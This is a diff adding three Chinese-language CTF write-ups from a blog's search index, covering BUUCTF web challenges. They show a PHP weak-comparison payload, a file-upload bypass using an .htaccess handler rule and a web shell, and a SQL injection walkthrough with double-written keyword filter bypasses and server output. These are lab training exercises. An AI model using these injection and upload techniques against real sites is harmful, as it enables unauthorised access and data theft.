@@ -2682,4 +2682,133 @@ index<span class="token punctuation">.</span>php</code></pre>
         <tag>BUUCTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ACTF2020_新生赛 BackupFile</title>
+    <url>/2021/03/09/actf2020-xin-sheng-sai-backupfile/</url>
+    <content><![CDATA[<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>扫描目录，下载index.php.bak(这就是备份文件)<img src="https://s3.ax1x.com/2021/03/09/68T7AH.png" alt="68T7AH.png"><code>index.php.bak</code>代码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Try to find out source file!"</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+</code></pre>
+<p>代码审计</p>
+<p>$key不为数字，且等于$str,显示flag</p>
+<p>这里涉及到php的弱类型，123==”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”</p>
+<p>传入参数得到flag</p>
+<pre class=" language-php"><code class="language-php">payload：
+<span class="token operator">?</span>key<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>str<span class="token operator">=</span><span class="token string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span></code></pre>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACTF2020_新生赛 Upload</title>
+    <url>/2021/03/09/actf2020-xin-sheng-sai-upload/</url>
+    <content><![CDATA[<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="http://i1.fuimg.com/734229/1b147342724fed60.png" alt="Markdown">上传一个php文件失败，尝试修改js，还是失败，后端应该有验证</p>
+<p><img src="http://i1.fuimg.com/734229/e71366de3ead9357.png" alt="Markdown"></p>
+<p>用bp抓包修改</p>
+<p><img src="http://i1.fuimg.com/734229/2e9b2c70e7f9a2e5.png" alt="Markdown">上传成功，蚁剑连接，找到flag</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span>htaccess
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">\.phtml$</span><span class="token punctuation">></span></span></span>
+    SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre>
+<pre class=" language-js"><code class="language-js">检查的js
+    <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>
+        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//提取上传文件的类型</span>
+        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传jpg、png、gif结尾的图片噢！"</span><span class="token punctuation">;</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+</code></pre>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战_2019 BabySQL</title>
+    <url>/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>有登录的一般都会想到万能密码，过滤了大不了绕过吧，和前面没多大区别</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password</code></pre>
+<p>未能成功，双写绕过<code>or</code>试试</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' oorr '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password</code></pre>
+<p>这里确实存在注入点，成功了，开始注入</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2  %23&amp;password=password
+报错，双写union select
+check.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password
+The used <span class="token keyword">SELECT</span> statements have <span class="token number">a</span> different number <span class="token keyword">of</span> <span class="token keyword">columns</span>
+
+<span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' ororderder by 3 %23&amp;password=2
+order被pass了，直接挨着猜
+check.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>
+<span class="token number">3</span>列，哈哈</code></pre>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>' ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>
+<span class="token comment" spellcheck="true">//Hello 10.3.18-MariaDB！</span>
+<span class="token comment" spellcheck="true">//Your password is 'geek'</span>
+<span class="token comment" spellcheck="true">//得到数据库版本和当前数据库名称</span>
+</code></pre>
+<p>爆所有数据库名</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' ununionion selselectect 1,2,group_concat(schema_name) frofromm infoorrmation_schema.schemata  %23&amp;password=2
+Hello 2！
+Your password is '</span>information_schema<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>test<span class="token punctuation">,</span>ctf<span class="token punctuation">,</span>geek'</code></pre>
+<p><code>ctf</code>可疑，爆表名</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>
+whwhereere table_schema<span class="token operator">=</span><span class="token string">'ctf'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> 
+Hello <span class="token number">2</span>！
+Your password <span class="token operator">is</span> <span class="token string">'Flag'</span></code></pre>
+<p>爆列名</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>
+whwhereere table_name<span class="token operator">=</span><span class="token string">'Flag'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> 
+Hello <span class="token number">2</span>！
+Your password <span class="token operator">is</span> <span class="token string">'flag'</span></code></pre>
+<p>爆数据</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>ctf<span class="token punctuation">.</span>Flag<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> 
+Hello <span class="token number">2</span>！
+Your password <span class="token operator">is</span> 'flag<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;cc46361f-7094-4e08-a744-2c4c3fcc9eb0&amp;#125;'</span></code></pre>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
 </search>
